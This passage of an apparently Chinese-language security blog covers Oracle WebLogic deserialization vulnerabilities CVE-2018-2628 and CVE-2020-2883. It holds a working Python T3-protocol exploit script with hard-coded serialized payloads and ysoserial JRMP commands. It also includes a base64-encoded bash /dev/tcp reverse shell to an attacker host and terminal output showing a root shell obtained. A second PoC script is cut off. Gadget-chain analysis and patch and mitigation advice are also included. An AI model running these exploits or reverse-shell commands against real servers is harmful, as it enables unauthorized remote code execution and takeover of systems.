class="string">&#x27;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    data2 = binascii.unhexlify(<span class="string">&#x27;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;&#123;:04x&#125;&#x27;</span>.<span class="built_in">format</span>(dport)))</span><br><span class="line"></span><br><span class="line">    data3 = binascii.unhexlify(<span class="string">&#x27;1a7727000d3234322e323134&#x27;</span>)</span><br><span class="line">    data4 = binascii.unhexlify(<span class="string">&#x27;2e312e32353461863d1d0000000078&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> [data1, data2, data3, data4]:</span><br><span class="line">        sock.send(d)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;send request payload successful, recv length: <span class="subst">&#123;<span class="built_in">len</span>(sock.recv(<span class="number">2048</span>))&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload_objdata</span>(<span class="params">sock, payload_hex</span>):</span><br><span class="line">    payload = binascii.unhexlify(</span><br><span class="line">        <span class="string">&#x27;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload += binascii.unhexlify(payload_hex)</span><br><span class="line">    payload += binascii.unhexlify(</span><br><span class="line">        <span class="string">&#x27;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    header = binascii.unhexlify(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">len</span>(payload) + <span class="number">4</span>:08x&#125;</span>&#x27;</span>)</span><br><span class="line">    sock.send(header + payload)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    sock.send(header + payload)</span><br><span class="line"></span><br><span class="line">    res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            chunk = sock.recv(<span class="number">4096</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            res += chunk</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error receiving data: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.decode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">dip, dport, path_payload</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">65</span>)</span><br><span class="line">    server_addr = (dip, dport)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        t3_handshake(sock, server_addr)</span><br><span class="line">        build_t3_request_object(sock, dport)</span><br><span class="line">        payload_hex = generate_payload(path_payload)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;payload: <span class="subst">&#123;payload_hex&#125;</span>&quot;</span>)</span><br><span class="line">        rs = send_payload_objdata(sock, payload_hex)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;response: <span class="subst">&#123;rs&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Exploit failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        sock.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;exploit completed!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\nUsage:\nexploit.py [victim ip] [victim port] [path to payload] &#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Eg: exploit.py 192.168.100.1 7001 payload.out&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;How to generate the payload :\n  java -jar ysoserial-all.jar &#123;jrmp_client&#125; &#123;jrmp_listener_ip&#125;:&#123;jrmp_listener_port&#125; &gt; payload.out&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;How to configure a JRMP server listener:\n  java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener &#123;jrmp_listener_port&#125; CommonsCollections1 &quot;command&quot;&#x27;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    dip = sys.argv[<span class="number">1</span>]</span><br><span class="line">    dport = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    path_payload = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    exploit(dip, dport, path_payload)</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="二、漏洞检测"><a href="#二、漏洞检测" class="headerlink" title="二、漏洞检测"></a><strong>二、漏洞检测</strong></h5><ol>
<li><strong>确认 T3 协议开放</strong><br>使用 <code>nmap</code> 扫描目标是否开启 T3 协议：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -v -p7001 靶机IP --script=weblogic-t3-info</span><br></pre></td></tr></table></figure>
若返回 <code>State: OPEN</code> 和版本信息，则存在漏洞风险。</li>
</ol>
<hr>
<h5 id="三、攻击流程"><a href="#三、攻击流程" class="headerlink" title="三、攻击流程"></a><strong>三、攻击流程</strong></h5><ol>
<li><p><strong>启动 JRMP 监听服务</strong><br>在攻击机上运行 <code>ysoserial</code> 启动 JRMP Server，监听指定端口并绑定恶意命令：  </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/weblogic_workplase]</span><br><span class="line">└─$ java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMjkvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line">* Opening JRMP listener on 1099 </span><br><span class="line">Have connection from /192.168.100.137:33292</span><br><span class="line">Reading message...</span><br><span class="line">Is DGC call for [[0:0:0, 199852631]]</span><br><span class="line">Sending return with payload for obj [0:0:0, 2]</span><br><span class="line">Closing connection</span><br></pre></td></tr></table></figure>
<p><strong>编码命令示例</strong>（反弹 Shell）：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/weblogic_workplase]             </span><br><span class="line">└─$ <span class="built_in">echo</span> -n <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.100.129/1234 0&gt;&amp;1&quot;</span> | <span class="built_in">base64</span>                                     </span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMjkvMTIzNCAwPiYx </span><br></pre></td></tr></table></figure>
<p><em>说明</em>：需将原始命令 Base64 编码，绕过 <code>Runtime.exec()</code> 的管道符限制。</p>
</li>
<li><p><strong>生成并发送 Payload</strong><br>使用 Python 脚本向目标发送构造的 T3 协议数据包：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/weblogic_workplase]                                                           </span><br><span class="line">└─$ java -jar ysoserial-all.jar JRMPClient 192.168.100.129:1099 &gt; payload.out2</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/weblogic_workplase]</span><br><span class="line">└─$ python CVE-2018-2628.py 192.168.100.137 7001 payload.out2</span><br></pre></td></tr></table></figure>
<p><em>参数说明</em>：  </p>
<ul>
<li><code>payload.out2</code>：为payload文件的路径。  </li>
<li><code>JRMPClient</code>：指定 Payload 类型（可选 <code>JRMPClient</code> 或 <code>JRMPClient2</code>）。</li>
</ul>
</li>
<li><p><strong>验证攻击结果</strong>  </p>
<ul>
<li><strong>反弹 Shell 验证</strong>：在攻击机开启监听 <code>nc -lvp 1234</code>，成功获取 Shell 即表示漏洞利用成功。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/weblogic_workplase]</span><br><span class="line">└─$ nc -lvnp 1234</span><br><span class="line">listening on [any] 1234 ...</span><br><span class="line">connect to [192.168.100.129] from (UNKNOWN) [192.168.100.137] 45138</span><br><span class="line">bash: cannot set terminal process group (1): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">root@4d40c6cc4a0e:~/Oracle/Middleware/user_projects/domains/base_domain#</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="五、攻击阶段流程"><a href="#五、攻击阶段流程" class="headerlink" title="五、攻击阶段流程"></a>五、攻击阶段流程</h4><h5 id="阶段-1：触发反序列化"><a href="#阶段-1：触发反序列化" class="headerlink" title="阶段 1：触发反序列化"></a><strong>阶段 1：触发反序列化</strong></h5><ul>
<li><strong>Payload 构造</strong>：<br><code>JRMPClient</code> 生成的 <code>Registry</code> 代理对象被反序列化后，触发 <code>RemoteObjectInvocationHandler</code> 的逻辑。</li>
<li><strong>绕过校验</strong>：<br>WebLogic 的补丁仅拦截了直接使用 <code>Registry</code> 接口的反序列化操作，但 <code>RemoteObjectInvocationHandler</code> 的调用链并未被完全过滤。</li>
</ul>
<h5 id="阶段-2：JRMP-协议交互"><a href="#阶段-2：JRMP-协议交互" class="headerlink" title="阶段 2：JRMP 协议交互"></a><strong>阶段 2：JRMP 协议交互</strong></h5><ul>
<li><strong>建立 JRMP 连接</strong>：<br><code>RemoteObjectInvocationHandler</code> 尝试连接到攻击机指定的 JRMP 服务（通过 <code>UnicastRef</code> 中的 <code>TCPEndpoint</code>）。</li>
<li><strong>二次反序列化</strong>：<br>攻击机的 JRMP 服务返回一个 <strong>真正的恶意对象</strong>（如 <code>CommonsCollections1</code>），WebLogic 在接收此对象时再次触发反序列化。</li>
</ul>
<h5 id="阶段-3：执行恶意代码"><a href="#阶段-3：执行恶意代码" class="headerlink" title="阶段 3：执行恶意代码"></a><strong>阶段 3：执行恶意代码</strong></h5><ul>
<li><strong>绕过黑名单</strong>：<br>二次反序列化的对象（如 <code>CommonsCollections1</code>）通过其他利用链（非 <code>Registry</code> 接口）绕过黑名单。</li>
<li><strong>代码执行</strong>：<br>最终触发 <code>InvokerTransformer</code> 或类似逻辑，执行系统命令。</li>
</ul>
<h4 id="六、漏洞修复与缓解"><a href="#六、漏洞修复与缓解" class="headerlink" title="六、漏洞修复与缓解"></a><strong>六、漏洞修复与缓解</strong></h4><ol>
<li><p><strong>官方补丁升级</strong>：<br>安装 Oracle 2018 年 4 月发布的 CPU 补丁（如 Patch Set Update 180417），修复反序列化逻辑并扩展黑名单。</p>
</li>
<li><p><strong>临时缓解措施</strong>：  </p>
<ul>
<li>禁用 T3 协议或限制访问 IP（通过 <code>ConnectionFilterImpl</code> 配置规则）。  </li>
<li>删除非必要的 <code>wls-wsat.war</code> 和 <code>wls9_async_response.war</code> 组件。</li>
</ul>
</li>
<li><p><strong>环境加固</strong>：  </p>
<ul>
<li>升级 JDK 至 7u21 以上版本，避免低版本反序列化漏洞。  </li>
<li>定期扫描 WebLogic 日志，监控异常 T3 连接请求。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a><strong>七、总结</strong></h4><p>CVE-2018-2628 的 <strong>本质是反序列化黑名单过滤机制不完善</strong>，结合 RMI 协议绕过实现远程代码执行。代码审计需重点关注 T3 协议处理逻辑、反序列化入口校验及补丁覆盖范围。实际利用中，攻击者常通过 JRMP 服务与 WebLogic 交互，因此网络隔离和协议控制是防御的关键。</p>
<h3 id="5-CVE-2020-2883"><a href="#5-CVE-2020-2883" class="headerlink" title="5.CVE-2020-2883"></a>5.CVE-2020-2883</h3><h4 id="1-漏洞背景-2"><a href="#1-漏洞背景-2" class="headerlink" title="1. 漏洞背景"></a><strong>1. 漏洞背景</strong></h4><p>CVE-2020-2883 是 Oracle WebLogic Server 中的一个高危反序列化远程代码执行（RCE）漏洞，影响版本包括 <strong>WebLogic 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0-12.2.1.5.0</strong>。攻击者通过 <strong>T3&#x2F;IIOP 协议</strong>发送恶意序列化数据，绕过黑名单过滤机制，触发未授权的远程代码执行。</p>
<hr>
<h4 id="2-漏洞核心原理"><a href="#2-漏洞核心原理" class="headerlink" title="2. 漏洞核心原理"></a><strong>2. 漏洞核心原理</strong></h4><h5 id="1-反序列化入口点"><a href="#1-反序列化入口点" class="headerlink" title="(1) 反序列化入口点"></a><strong>(1) 反序列化入口点</strong></h5><p>WebLogic 在处理 T3&#x2F;IIOP 协议请求时，对传入的序列化数据执行反序列化操作。漏洞的关键在于以下两点：</p>
<ul>
<li><strong>未严格校验输入数据</strong>：WebLogic 未对反序列化的类进行充分校验，导致恶意对象被解析。</li>
<li><strong>利用链（Gadget Chain）绕过黑名单</strong>：攻击者通过构造未被黑名单覆盖的类组合链，触发代码执行。</li>
</ul>
<h5 id="2-漏洞利用链（Gadget-Chain）"><a href="#2-漏洞利用链（Gadget-Chain）" class="headerlink" title="(2) 漏洞利用链（Gadget Chain）"></a><strong>(2) 漏洞利用链（Gadget Chain）</strong></h5><p>CVE-2020-2883 的利用链基于 <strong>Apache Commons Collections</strong> 的变种或其他 WebLogic 内部类的组合。典型利用链如下：</p>
<ol>
<li><strong>触发点类</strong>：例如 <code>PriorityQueue</code>，其 <code>readObject</code> 方法在反序列化时会调用 <code>comparator</code> 的比较操作。</li>
<li><strong>恶意比较器（Comparator）</strong>：例如 <code>ExtractorComparator</code>，通过反射调用 <code>ValueExtractor</code> 的 <code>extract</code> 方法。</li>
<li><strong>代码执行类</strong>：例如 <code>ReflectionExtractor</code> 或 <code>ChainedExtractor</code>，最终调用 <code>Runtime.getRuntime().exec()</code> 执行系统命令。</li>
</ol>
<p><strong>示例利用链</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue -&gt; ExtractorComparator -&gt; ChainedExtractor -&gt; ReflectionExtractor -&gt; Runtime.exec()</span><br></pre></td></tr></table></figure>

<h5 id="3-绕过补丁机制"><a href="#3-绕过补丁机制" class="headerlink" title="(3) 绕过补丁机制"></a><strong>(3) 绕过补丁机制</strong></h5><ul>
<li><strong>黑名单绕过</strong>：Oracle 在修复 CVE-2018-2628 时，仅将部分危险类（如 <code>InvokerTransformer</code>）加入黑名单。CVE-2020-2883 利用未被覆盖的类（如 <code>ExtractorComparator</code>）构造新利用链。</li>
<li><strong>动态代理与反射</strong>：通过 <code>RemoteObjectInvocationHandler</code> 等类动态代理恶意对象，绕过静态检测。</li>
</ul>
<hr>
<h4 id="3-漏洞触发流程"><a href="#3-漏洞触发流程" class="headerlink" title="3. 漏洞触发流程"></a><strong>3. 漏洞触发流程</strong></h4><ol>
<li><p><strong>构造恶意序列化对象</strong>：</p>
<ul>
<li>使用 <code>ysoserial</code> 或自定义工具生成包含命令执行逻辑的序列化数据。</li>
<li>示例命令：<code>bash -c &#123;echo,&lt;base64编码命令&gt;&#125;|&#123;base64,-d&#125;|bash</code>。</li>
</ul>
</li>
<li><p><strong>通过 T3 协议发送 Payload</strong>：</p>
<ul>
<li>T3 协议默认监听端口 <strong>7001</strong>，攻击者将恶意数据封装为 T3 协议数据包发送至目标服务器。</li>
</ul>
</li>
<li><p><strong>反序列化触发代码执行</strong>：</p>
<ul>
<li>WebLogic 反序列化恶意数据时，依次触发利用链中的类方法，最终执行系统命令。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="4-关键代码分析"><a href="#4-关键代码分析" class="headerlink" title="4. 关键代码分析"></a><strong>4. 关键代码分析</strong></h4><h5 id="1-反序列化入口-1"><a href="#1-反序列化入口-1" class="headerlink" title="(1) 反序列化入口"></a><strong>(1) 反序列化入口</strong></h5><p>WebLogic 的 <code>weblogic.rjvm.InboundMsgAbbrev</code> 类处理 T3 协议数据，调用 <code>readObject</code> 方法反序列化输入流：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.stream.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-利用链构造"><a href="#2-利用链构造" class="headerlink" title="(2) 利用链构造"></a><strong>(2) 利用链构造</strong></h5><p>攻击者构造的恶意对象利用 <code>ExtractorComparator</code> 触发反射：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 恶意 Comparator 触发 ValueExtractor</span></span><br><span class="line"><span class="type">ExtractorComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExtractorComparator</span>();</span><br><span class="line">comparator.setExtractor(<span class="keyword">new</span> <span class="title class_">ChainedExtractor</span>(extractors));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发比较操作，反射调用 Runtime.exec()</span></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(...);</span><br></pre></td></tr></table></figure>

<h5 id="3-命令执行"><a href="#3-命令执行" class="headerlink" title="(3) 命令执行"></a><strong>(3) 命令执行</strong></h5><p>最终通过反射调用 <code>Runtime</code> 类执行命令：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) m.invoke(<span class="literal">null</span>);</span><br><span class="line">r.exec(<span class="string">&quot;bash -c &lt;恶意命令&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="5-补丁与防御"><a href="#5-补丁与防御" class="headerlink" title="5. 补丁与防御"></a><strong>5. 补丁与防御</strong></h4><h5 id="1-官方补丁"><a href="#1-官方补丁" class="headerlink" title="(1) 官方补丁"></a><strong>(1) 官方补丁</strong></h5><p>Oracle 通过以下方式修复漏洞：</p>
<ul>
<li><strong>扩展黑名单</strong>：将 <code>ExtractorComparator</code>、<code>ReflectionExtractor</code> 等类加入反序列化黑名单。</li>
<li><strong>增强协议过滤</strong>：限制 T3&#x2F;IIOP 协议的反序列化操作。</li>
</ul>
<h5 id="2-缓解措施"><a href="#2-缓解措施" class="headerlink" title="(2) 缓解措施"></a><strong>(2) 缓解措施</strong></h5><ul>
<li><strong>禁用 T3&#x2F;IIOP 协议</strong>：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 修改 config.xml --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">connection-filter</span>&gt;</span>t3 127.0.0.1 allow<span class="tag">&lt;/<span class="name">connection-filter</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>升级至最新版本</strong>：应用 Oracle 2020 年 4 月及之后的关键补丁（CPU）。</li>
<li><strong>网络隔离</strong>：限制 WebLogic 端口（7001、7002）的公网访问。</li>
</ul>
<hr>
<h4 id="6-漏洞复现"><a href="#6-漏洞复现" class="headerlink" title="6.漏洞复现"></a>6.漏洞复现</h4><h5 id="（1）-PoC"><a href="#（1）-PoC" class="headerlink" title="（1） PoC"></a>（1） PoC</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">globalProxies = &#123;&#125;</span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parseUrl</span>(<span class="params">url</span>):</span><br><span class="line">    parsed = urlparse.urlparse(url)</span><br><span class="line">    proto = parsed.scheme</span><br><span class="line">    netloc = parsed.netloc</span><br><span class="line">    ip = netloc</span><br><span class="line">    <span class="keyword">if</span> proto == <span class="string">&#x27;http&#x27;</span>:</span><br><span class="line">        port = <span class="number">80</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        port = <span class="number">443</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span 